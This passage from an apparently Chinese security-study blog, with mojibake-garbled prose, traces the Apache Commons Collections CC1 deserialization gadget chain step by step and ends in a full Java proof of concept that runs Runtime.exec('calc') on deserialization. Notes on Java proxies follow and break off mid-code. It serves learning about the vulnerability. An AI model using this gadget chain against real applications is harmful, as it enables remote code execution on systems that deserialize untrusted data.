class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(hashMap,<span class="literal">null</span>,invokerTransformer);</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;Object, Object&gt; map:transformedMap.entrySet())&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">            map.setValue(runtime);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240402002332518.png" alt="image-20240402002332518"></p><p>ç„¶åæˆ‘ä»¬çœ‹çœ‹æœ‰è°çš„ readObject è°ƒç”¨äº† setvalue</p><h3 id="AnnotationInvocationHandler-readObject">AnnotationInvocationHandler.readObject</h3><p>åœ¨ jdk8u71 å‰ ï¼Œ è¯¥ç±»çš„æºç æ˜¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"><span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line"><span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Entry)var4.next();</span><br><span class="line"><span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br><span class="line"><span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);</span><br><span class="line"><span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();</span><br><span class="line"><span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">        var5.setValue((<span class="keyword">new</span></span><br><span class="line">                      <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 +</span><br><span class="line">        <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸€ä¸ª setValue() å‡½æ•°</p><p>å› ä¸ºAnnotationInvocationHandleræœªæœ‰æè¿°ï¼Œé»˜è®¤ä¸ºDefaultç±»ï¼Œåªèƒ½é€šè¿‡åå°„è°ƒç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RunTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(hashMap,<span class="literal">null</span>,invokerTransformer);</span><br><span class="line"><span class="comment">//        for (Map.Entry&lt;Object, Object&gt; map:transformedMap.entrySet())&#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(&quot;1&quot;);</span></span><br><span class="line"><span class="comment">//            map.setValue(runtime);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>constructor.newInstance(Override.class,transformedMap);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ä¸€äº›å°é—®é¢˜</strong></p><p>ç¬¬ä¸€ä¸ªå°±æ˜¯æˆ‘ä»¬ä¹‹å‰ setValue çš„æ—¶å€™ç›´æ¥è®¾ç½®Runtimeå¯¹è±¡ï¼Œè€Œè¿™é‡Œæ˜¯AnnotationTypeMismatchExceptionProxy å¯¹è±¡</p><p>ç¬¬äºŒä¸ªé—®é¢˜å°±æ˜¯ Runtime å¯¹è±¡ä¸èƒ½åºåˆ—åŒ–ï¼Œåªèƒ½é€šè¿‡åå°„</p><p>ç¬¬ä¸‰ä¸ªé—®é¢˜å°±æ˜¯æƒ³è¦è°ƒç”¨ setValue è¦æœ‰å‡ ä¸ªifåˆ¤æ–­</p><h3 id="è§£å†³Runtimeå¯¹è±¡åºåˆ—åŒ–">è§£å†³Runtimeå¯¹è±¡åºåˆ—åŒ–</h3><p>Runtime å¯¹è±¡ä¸èƒ½åºåˆ—åŒ–ï¼Œä½†æ˜¯ Runtime.class å¯ä»¥åºåˆ—åŒ–ï¼Œé€šè¿‡åå°„æ¥è°ƒç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRuntime&quot;</span> , <span class="literal">null</span>);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) getRuntimeMethod.invoke(<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">execMethod.invoke(r,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure><p>ç„¶åå†å°†å…¶ä¿®æ”¹ä¸º InvokerTransformer ç‰ˆæœ¬</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span> , <span class="literal">null</span>&#125;).transform(Runtime.class);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span> , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125; , <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;).transform(getRuntimeMethod);</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå› ä¸ºæ˜¯é‡å¤è°ƒç”¨ï¼Œæ‰€ä»¥è€ƒè™‘ ChainedTransformer</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240402005900939.png" alt="image-20240402005900939"></p><p>å¯ä»¥çœ‹åˆ° ChainedTransformer çš„æ„é€ å‡½æ•°ä¸­ä¼ é€’ä¸€ä¸ªæ–¹æ³•æ•°ç»„å¹¶ä¸”èµ‹å€¼ç»™è¿™ä¸ªå˜é‡ï¼Œç„¶ååœ¨transformä¸­è¿›è¡Œé€’å½’è°ƒç”¨é‚£æˆ‘ä»¬å…ˆå®šä¹‰ä¸€ä¸ª Transformer æ•°ç»„ï¼Œç„¶åä¼ å…¥ ChainedTransformer</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure><h3 id="ifåˆ¤æ–­">ifåˆ¤æ–­</h3><p>ç¬¬ä¸€ä¸ªifåˆ¤æ–­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memberType != <span class="literal">null</span></span><br></pre></td></tr></table></figure><p>æ˜¯è®©æˆ‘ä»¬çš„mapé‡Œé¢çš„keyä¸æˆå‘˜æ–¹æ³•ç›¸åŒ</p><p>è·Ÿè¿› Override å‘ç° target é‡Œé¢æœ‰ä¸ª value æ–¹æ³•ï¼Œæ‰€ä»¥å°† Override.class ä¿®æ”¹ä¸º target.class å¹¶ä¸”å°†mapçš„&quot;key&quot;ä¿®æ”¹ä¸º&quot;value&quot;</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240402010756051.png" alt="image-20240402010756051"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240402010823727.png" alt="image-20240402010823727"></p><h3 id="AnnotationTypeMismatchExceptionProxyå¯¹è±¡">AnnotationTypeMismatchExceptionProxyå¯¹è±¡</h3><p>æˆ‘ä»¬èµ°åˆ°è¿™é‡Œçš„æ—¶å€™ä¼šå‘ç°ï¼Œè¿™é‡Œçš„valueæ˜¯ AnnotationTypeMismatchExceptionProxy å¯¹è±¡</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240402010942132.png" alt="image-20240402010942132"></p><p>å›å¿†ä¸€ä¸‹å‰é¢ chainedTransformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chainedTransformer.transform(Runtime.class);</span><br></pre></td></tr></table></figure><p>è°ƒç”¨çš„æ˜¯Runtime.classå¯¹è±¡</p><p>è¿™é‡Œå¼•å…¥å¦ä¸€ä¸ªç±»ï¼š ConstantTransformer</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240402011144425.png" alt="image-20240402011144425"></p><p>å¯ä»¥çœ‹åˆ° ConstantTransformer.transform ä¸ç®¡ä¼ å…¥ä»€ä¹ˆéƒ½ä¼šè¿”å›å›ºå®šçš„å€¼</p><p>é‚£ä¹ˆæˆ‘ä»¬åªè¦è®©è¿™ä¸ª iConstantä¸ºRuntime.class å³å¯</p><h3 id="æœ€ç»ˆPOC">æœ€ç»ˆPOC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RunTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//æ„é€ transformersè°ƒç”¨é“¾</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(hashMap,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>constructor.newInstance(Target.class,transformedMap);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Javaä»£ç†">Javaä»£ç†:</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">ProxyTest.java</span><br><span class="line"><span class="keyword">package</span> daili;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxyTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">IUser</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserImpl</span>();</span><br><span class="line"><span class="comment">//        user.show();</span></span><br><span class="line">        <span class="comment">//é™æ€ä»£ç†</span></span><br><span class="line"><span class="comment">//        IUser userproxy = new UserProxy(user);</span></span><br><span class="line"><span class="comment">//        userproxy.show();</span></span><br><span class="line">        <span class="comment">//åŠ¨æ€ä»£ç†</span></span><br><span class="line">        <span class="comment">//è¦ä»£ç†çš„æ¥å£ã€è¦åšçš„äº‹æƒ…ã€Classloaderç±»åŠ è½½å™¨</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">userinvocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserInvocationHandler</span>(user);</span><br><span class="line">        <span class="type">IUser</span> <span class="variable">userproxy</span> <span class="operator">=</span> (IUser) Proxy.newProxyInstance(user.getClass().getClassLoader(),user.getClass().getInterfaces(),userinvocationHandler);</span><br><span class="line">        userproxy.show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">UerImpl.java</span><br><span class="line"><span class="keyword">package</span> daili;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserImpl</span> <span class="keyword">implements</span> <span class="title class_">IUser</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserImpl</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;å±•ç¤º&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">IUser.javaæ¥å£</span><br><span class="line"><span class="keyword">package</span> daili;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IUser</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="é™æ€ä»£ç†ï¼š4">é™æ€ä»£ç†ï¼š4</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> daili;</span><br><span class="line"><span class="comment">//é™æ€ä»£ç†</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserProxy</span> <span class="keyword">implements</span> <span class="title class_">IUser</span>&#123;</span><br><span class="line">    IUser user;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserProxy</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserProxy</span><span class="params">(IUser user)</span>&#123;<span class="built_in">this</span>.user = user; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">        user.show();</span><br><span class="line">        System.out.println(<span class="string">&quot;è°ƒç”¨äº†show&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="åŠ¨æ€ä»£ç†ï¼š">åŠ¨æ€ä»£ç†ï¼š</h4><p>å¦‚æœè°ƒç”¨äº†åŠ¨æ€ä»£ç†ç±»çš„ä»»æ„æ–¹æ³•ï¼Œåˆ™ä¼šè°ƒç”¨åŠ¨æ€ä»£ç†ç±»ä¸­çš„invokeæ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">UserInvocationHanderler.java</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> daili;</span><br><span class="line"><span class="comment">//åŠ¨æ€ä»£ç†</span></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>&#123;</span><br><span class="line">    IUser user;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserInvocationHandler</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserInvocationHandler</span><span class="params">(IUser user)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.user = user;</span><br><span class="line">    &#125;</span><br><span class="line">    <span 